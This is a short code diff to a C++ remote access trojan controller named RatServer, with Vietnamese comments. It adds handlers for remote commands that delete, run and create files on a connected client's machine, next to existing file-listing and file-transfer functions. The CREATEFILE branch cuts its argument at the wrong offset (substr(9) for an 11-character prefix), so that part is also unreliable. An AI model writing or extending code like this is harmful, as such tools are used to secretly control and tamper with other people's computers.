@@ -35,6 +35,8 @@ std::string SocketClient::Receive() {
     return std::string(buffer, bytes);
 }
 
+
+
 class DownloadManager
 {
 public:
@@ -237,6 +239,16 @@ void RatServer::HandleCommand(const std::string& input) {
         std::string filename = input.substr(9);
         SendFileContent(filename);
     }
+    else if (input.rfind("REMOVEFILE ", 0) == 0) { // Thêm nhánh xử lý phản hồi lệnh REMOVEFILE
+        ReceiveStatus();
+    }
+    else if (input.rfind("RUNFILE ", 0) == 0) { // Thêm nhánh xử lý phản hồi lệnh RUNFILE
+        ReceiveStatus();
+    }
+    else if (input.rfind("CREATEFILE ", 0) == 0) { // Thêm nhánh xử lý CREATEFILE
+        std::string filename = input.substr(9);
+        SendFileContent(filename);
+    }
 }
 
 void RatServer::ListFile() {
@@ -248,7 +260,6 @@ void RatServer::ListFile() {
     std::cout << "\n--- Danh sach file cua Client ---\n";
     std::cout << response << std::endl;
 }
-
 
 std::string SocketClient::ReceiveUntilTimeout(DWORD timeout) {
     setsockopt(socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
@@ -294,6 +305,7 @@ void RatServer::SendFileContent(std::string& filename) {
         std::cout << "[-] Client khong san sang. Phan hoi: " << clientSignal << std::endl;
     }
 }
+
 
 
 int main() {
